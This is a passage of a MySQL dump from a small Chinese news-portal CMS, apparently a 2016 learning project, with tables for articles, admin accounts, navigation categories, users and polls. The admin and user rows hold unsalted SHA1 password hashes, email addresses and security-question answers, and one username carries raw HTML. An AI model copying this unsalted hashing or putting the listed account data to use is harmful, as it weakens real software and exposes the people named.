\'31c1912407e371e4-828469e4e81ce6b0\', \'#section9\', \'pcpid\']);\">9版本选择</a></li>\r\n</ol>\r\n\r\n<h3>注释：</h3>\r\n\r\n<p>页面中数据来源：3D 陶瓷机身：小米5正面采用康宁大猩猩玻璃，中框采用铝合金材质，标准版、高配版 后盖采用3D 玻璃材质，尊享版后盖采用3D 陶瓷材质；CPU 性能翻倍：相比骁龙810处理器性能提升1倍， 数据对比来自 Qualcomm 官网及 Qualcomm 平台测试数据；快40%的图形引擎： 较前一代 Adreno 430 图形处理器性能提升40%，数据对比来自 Qualcomm 官网及 Qualcomm 平台测试数据；129g：129g为3D 玻璃版本，3D 陶瓷版本约为139g，有微小浮动属正常范围；提速87%：相较 eMMC5.1传输速度提升 87%，本数据为我公司实验室测试数据；快100%：根据理论主频速度推算所得，为小米5 采用的 LPDDR4 对比 采用的 LPDDR3的小米自有手机 ；14万分：CPU 跑分数据为实验室采用 Antutu V6.0.4 测试，实际情况会因测试软件版本、具体测试环境、小米5具体版本不同，而略有差异；亮度提升30%：相比其他小米系列手机屏幕亮度450nit ，小米5 屏幕亮度为600nit，根据计算(600 &ndash; 450 ) /450 = 33%，亮度提升30%以上；美颜通话、一键换机、手机远程锁定防丢失功能：目前仅限于MIUI开发版，在初期出厂批次手机中并未包含。视频电话功能目前可通过小米应用商店获取。一键换机及手机远程锁定防丢失功能，后续可通过系统升级获取。页面中所对比的一般手机，均为小米自有手机。以上数据实际情况会因测试软件版本、具体测试环境、具体版本不同，而略有差异。</p>\r\n\r\n<h3><a href=\"http://www.mi.com/mi5/features\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-580fb9cc110ba9c5\', \'/mi5/features\', \'pcpid\']);\">是什么让 小米5 快得如此惊人?</a></h3>\r\n\r\n<p><a href=\"http://www.mi.com/mi5/features\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-580fb9cc110ba9c5\', \'/mi5/features\', \'pcpid\']);\">继续了解 黑科技 &gt;</a></p>\r\n',1,102,100,0,0,'','2016-04-30 20:06:23');
/*!40000 ALTER TABLE `cms_content` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_level`
--

DROP TABLE IF EXISTS `cms_level`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_level` (
  `id` int(8) unsigned NOT NULL AUTO_INCREMENT,
  `level_name` varchar(20) NOT NULL COMMENT '等级名称',
  `level_info` varchar(200) NOT NULL COMMENT '等级说明',
  `permission` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_level`
--

LOCK TABLES `cms_level` WRITE;
/*!40000 ALTER TABLE `cms_level` DISABLE KEYS */;
INSERT INTO `cms_level` VALUES (1,'超级管理员','具有最高权限！','1,2,3'),(2,'普通管理员','不能操作其他管理员，其他均可操作.',''),(3,'发帖专员','发表文章',''),(4,'评论专员','可以回复评论以及删除评论',''),(5,'会员管理员','只有管理会员的权限',''),(6,'后台游客','只能访问后台','');
/*!40000 ALTER TABLE `cms_level` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_manage`
--

DROP TABLE IF EXISTS `cms_manage`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_manage` (
  `id` int(8) unsigned NOT NULL AUTO_INCREMENT,
  `admin_user` varchar(20) NOT NULL COMMENT '管理员账户',
  `admin_pass` char(40) NOT NULL COMMENT '管理员密码',
  `level` tinyint(1) unsigned NOT NULL DEFAULT '1' COMMENT '管理员等级',
  `login_count` smallint(5) unsigned NOT NULL DEFAULT '0' COMMENT '管理员登录次数',
  `last_ip` varchar(20) NOT NULL DEFAULT '000.000.000.000' COMMENT '最后登录的ip',
  `last_time` datetime NOT NULL COMMENT '最后登录的时间',
  `reg_time` datetime NOT NULL COMMENT '注册时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=56 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_manage`
--

LOCK TABLES `cms_manage` WRITE;
/*!40000 ALTER TABLE `cms_manage` DISABLE KEYS */;
INSERT INTO `cms_manage` VALUES (35,'admin','7c4a8d09ca3762af61e59520943dc26494f8941b',1,28,'::1','2016-05-27 21:56:36','2016-03-25 16:29:42'),(36,'hejunwei','7c4a8d09ca3762af61e59520943dc26494f8941b',2,0,'000.000.000.000','0000-00-00 00:00:00','2016-03-25 16:49:16'),(39,'make','7c4a8d09ca3762af61e59520943dc26494f8941b',6,0,'000.000.000.000','0000-00-00 00:00:00','2016-03-25 16:58:25'),(40,'majialichen','7c4a8d09ca3762af61e59520943dc26494f8941b',1,0,'000.000.000.000','0000-00-00 00:00:00','2016-03-25 17:13:44'),(41,'123','7c4a8d09ca3762af61e59520943dc26494f8941b',4,2,'::1','2016-04-24 23:28:50','2016-03-25 17:28:26'),(42,'啊啊','7c4a8d09ca3762af61e59520943dc26494f8941b',3,0,'000.000.000.000','0000-00-00 00:00:00','2016-03-25 17:47:09'),(43,'fuck','7c4a8d09ca3762af61e59520943dc26494f8941b',3,0,'000.000.000.000','0000-00-00 00:00:00','2016-03-25 21:48:02'),(44,'he','7c4a8d09ca3762af61e59520943dc26494f8941b',1,2,'::1','2016-03-30 14:34:38','2016-03-25 21:48:15'),(46,'123456','7c4a8d09ca3762af61e59520943dc26494f8941b',6,0,'000.000.000.000','0000-00-00 00:00:00','2016-03-25 21:48:55'),(47,'789','1a2bf0adea0f4b41ed9f7a02d31fa535d5743f3e',1,0,'000.000.000.000','0000-00-00 00:00:00','2016-03-25 21:49:06'),(48,'<b>hhaha</b>','601f1889667efaebb33b8c12572835da3f027f78',2,0,'000.000.000.000','0000-00-00 00:00:00','2016-03-29 13:07:07'),(53,'hehehe','601f1889667efaebb33b8c12572835da3f027f78',6,0,'000.000.000.000','0000-00-00 00:00:00','2016-03-29 16:11:23'),(54,'duck','3d4f2bf07dc1be38b20cd6e46949a1071f9d0e3d',1,0,'000.000.000.000','0000-00-00 00:00:00','2016-03-29 16:11:38'),(55,'hahaha','7c4a8d09ca3762af61e59520943dc26494f8941b',6,0,'000.000.000.000','0000-00-00 00:00:00','2016-04-15 12:37:21');
/*!40000 ALTER TABLE `cms_manage` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_nav`
--

DROP TABLE IF EXISTS `cms_nav`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_nav` (
  `id` int(8) unsigned NOT NULL AUTO_INCREMENT,
  `nav_name` varchar(20) NOT NULL,
  `nav_info` varchar(200) NOT NULL,
  `pid` int(8) unsigned NOT NULL DEFAULT '0' COMMENT '父类导航',
  `sort` int(8) unsigned NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=35 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_nav`
--

LOCK TABLES `cms_nav` WRITE;
/*!40000 ALTER TABLE `cms_nav` DISABLE KEYS */;
INSERT INTO `cms_nav` VALUES (1,'军事动态','主要是军事相关的新闻',0,12),(2,'八卦娱乐','明星八卦新闻',0,22),(3,'时尚女人','关于时尚和女人方面的',0,3),(4,'IT频道','关于IT的',0,4),(5,'智能手机','关于智能手机的推荐',0,5),(8,'美容护肤','美容护肤',0,6),(9,'热门汽车','热门汽车',0,9),(10,'房产家居','房产家居',0,10),(11,'读书教育','读书教育',0,11),(12,'黑客联盟','关于渗透的黑客联盟',0,1),(17,'逆向工程','OD反编译',12,4),(19,'sqlmap','数据库注入',12,3),(20,'kali','linux黑客工具箱',12,2),(21,'中国军事','关于国内军事',1,21),(23,'wifi破解','WPA WEP水滴，CDLinux',12,1),(25,'美国军事','美国军事',1,25),(26,'日本军事','日本军事',1,26),(27,'手机软件','手机软件',5,27),(28,'手机SIM卡','手机SIM卡',5,28),(29,'美食烹饪','美食烹饪',3,29),(30,'云计算','云计算',4,30),(31,'社会工程','社会工程学',12,31),(32,'PHP','php开发',4,32),(33,'行业行情','行业行情\r\n',4,33),(34,'女性明星','女性明星',3,34);
/*!40000 ALTER TABLE `cms_nav` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_permission`
--

DROP TABLE IF EXISTS `cms_permission`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_permission` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `info` varchar(200) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_permission`
--

LOCK TABLES `cms_permission` WRITE;
/*!40000 ALTER TABLE `cms_permission` DISABLE KEYS */;
INSERT INTO `cms_permission` VALUES (1,'',''),(2,'水电费',''),(3,'啊实打实大','啊实打实大');
/*!40000 ALTER TABLE `cms_permission` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_system`
--

DROP TABLE IF EXISTS `cms_system`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_system` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键',
  `webname` varchar(50) DEFAULT '0',
  `page_size` tinyint(4) DEFAULT '0',
  `article_size` tinyint(4) DEFAULT '0',
  `nav_size` tinyint(4) DEFAULT '0',
  `updir` varchar(50) DEFAULT '0' COMMENT '上传文件',
  `ro_time` tinyint(4) DEFAULT '0' COMMENT '轮播器的次数',
  `ro_speed` tinyint(4) DEFAULT '0' COMMENT '轮播器的速度',
  `adver_text_num` tinyint(4) DEFAULT '0',
  `adver_pic_num` tinyint(4) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_system`
--

LOCK TABLES `cms_system` WRITE;
/*!40000 ALTER TABLE `cms_system` DISABLE KEYS */;
/*!40000 ALTER TABLE `cms_system` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_user`
--

DROP TABLE IF EXISTS `cms_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_user` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user` varchar(20) NOT NULL,
  `pass` char(40) NOT NULL,
  `email` varchar(30) NOT NULL,
  `face` varchar(10) NOT NULL,
  `question` varchar(20) NOT NULL,
  `answer` varchar(20) NOT NULL,
  `state` tinyint(1) NOT NULL DEFAULT '1',
  `time` char(10) NOT NULL,
  `date` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_user`
--

LOCK TABLES `cms_user` WRITE;
/*!40000 ALTER TABLE `cms_user` DISABLE KEYS */;
INSERT INTO `cms_user` VALUES (2,'hejunwei','7c4a8d09ca3762af61e59520943dc26494f8941b','405947712@qq.com','01.gif','您配偶的出生地','家庭主妇',4,'1462068998','2016-04-11 13:56:21'),(8,'majialichen','7c4a8d09ca3762af61e59520943dc26494f8941b','majialichen@qq.com','12.gif','您父亲的姓名','aaa',1,'1461209170','2016-04-11 17:01:29'),(10,'ma','7c4a8d09ca3762af61e59520943dc26494f8941b','15891291118@163.com','12.gif','您父亲的姓名','啊啊飒飒的',5,'1460390390','2016-04-11 23:59:50'),(12,'哈哈哈','601f1889667efaebb33b8c12572835da3f027f78','405923@qq.com','01.gif','','',4,'1460818532','2016-04-16 22:55:32'),(13,'hahahaha','7c4a8d09ca3762af61e59520943dc26494f8941b','hejunwei@gmail.com','01.gif','','',1,'1461602007','2016-04-26 00:33:28'),(14,'hejunwei000','7c4a8d09ca3762af61e59520943dc26494f8941b','15891291118@164.com','17.gif','','',1,'1461681221','2016-04-26 22:33:41');
/*!40000 ALTER TABLE `cms_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cms_vote`
--

DROP TABLE IF EXISTS `cms_vote`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cms_vote` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(20) NOT NULL,
  `info` varchar(200) NOT NULL,
  `vid` int(11) NOT NULL,
  `vote_count` int(11) NOT NULL,
  `state` tinyint(4) NOT NULL,
  `date` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cms_vote`
--

LOCK TABLES `cms_vote` WRITE;
/*!40000 ALTER TABLE `cms_vote` DISABLE KEYS */;
INSERT INTO `cms_vote` VALUES (1,'123','asd345',0,0,0,'2016-05-15 14:43:57'),(5,'123','asd',1,0,0,'2016-05-15 21:54:44'),(6,'你们导员对你好吗','呵呵',0,0,0,'2016-05-19 23:53:03'),(7,'好好好','好',6,0,0,'2016-05-19 23:53:22'),(8,'不好','不好\r\n',6,0,0,'2016-05-19 23:53:36'),(9,'请问您是怎么知道本站的','请问您是怎么知道本站的',0,0,1,'2016-05-22 13:16:59'),(10,'门户网站的搜素引擎','门户网站的搜素引擎',9,0,0,'2016-05-22 13:17:09'),(11,'Google百度搜素','Google百度搜素',9,2,0,'2016-05-22 13:17:19'),(12,'别的网站的链接','别的网站的链接',9,0,0,'2016-05-22 13:17:26'),(13,'朋友介绍或电视广告','朋友介绍或电视广告',9,0,0,'2016-05-22 13:17:32');
/*!40000 ALTER TABLE `cms_vote` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2016-05-29  0:38:45
